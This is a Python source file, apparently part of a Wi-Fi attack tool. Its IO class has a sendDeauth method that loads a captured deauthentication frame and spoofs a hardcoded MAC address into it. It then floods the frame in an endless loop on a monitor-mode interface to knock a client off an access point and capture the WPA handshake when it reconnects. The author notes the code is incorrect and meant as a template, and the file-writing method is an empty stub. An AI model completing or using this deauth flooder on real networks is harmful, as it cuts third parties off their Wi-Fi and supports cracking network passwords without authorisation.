from pcap import pcapObject
from socket import socket, AF_PACKET, SOCK_RAW

'''
    Class responsible for all socket and I/O operations. 
'''
class IO:

    '''
        Sends a spoofed deauth packet from the client (CLI) to the access point
        (AP) in order to generate a 3-way handshake upon reconnection.
        @param: AP: Access point that receives the deauth packet.
        @param CLI: Client that will be deauthenticated from the access point.
        @param NIC: Network card to send the deauth packet on.
        @return: Boolean value representing the success of the method.
    '''
    def sendDeauth(self, AP, CLI, NIC):

        '''
            Code is currently incorrect and needs
            to be reexamined. Code can be used as a template.
        '''

        s = socket(AF_PACKET, SOCK_RAW)
        pc = pcapObject()
        pc.open_offline("/home/richard/Desktop/deauth.pcap")
        packet_file = open("deauth.pcap")
        s.bind(("wlan0mon", 0))

        deauth = pc.next()

        # Make sure I have the correct bytes for Dest Addr
        # print binascii.hexlify(deauth[1][17:23])

        # Make Sure I have the correct bytes for the Transmitter Address
        # print binascii.hexlify(deauth[1][23:29])

        # Make sure I have the correct BSSID (AP MAC)
        # print binascii.hexlify(deauth[1][29:35])

        # deauth[1][17:23] = '\x00\x71\x47\xD4\xB7\x02'

        # Change to  desired AP MAC
        # deauth[1][29:35] =

        packet = deauth[1][0:17]
        packet += '\x00\xc0\xca\x6d\xae\xd8'
        packet += deauth[1][23:]

        # Print modified packet
        # print binascii.hexlify(packet)

        while True:
            s.send(packet)

    '''
        Writes packets to a file.
        3-way handshake should be included.
        @param data: Data containing the 3-way handshake. 
                     Data may be a scapy instance.
    '''
    def writeFile(self, data):
        return
